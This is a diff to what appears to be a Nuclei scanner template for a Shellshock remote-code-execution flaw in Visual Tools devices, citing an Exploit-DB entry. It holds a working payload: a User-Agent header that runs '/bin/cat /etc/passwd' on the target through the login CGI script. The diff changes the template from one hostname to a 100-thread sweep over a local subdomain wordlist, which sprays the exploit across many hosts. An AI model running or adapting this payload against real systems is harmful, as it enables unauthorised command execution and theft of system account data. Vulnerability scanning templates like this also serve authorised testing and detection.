@@ -9,12 +9,16 @@ info:
     - https://www.exploit-db.com/exploits/50098
   tags: visualtools,rce,oob
 
-
 requests:
-  - raw:
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
+
+    raw:
       - |
         GET /cgi-bin/slogin/login.py HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{Subdomains}}
         Accept: */*
         User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd
     matchers-condition: and
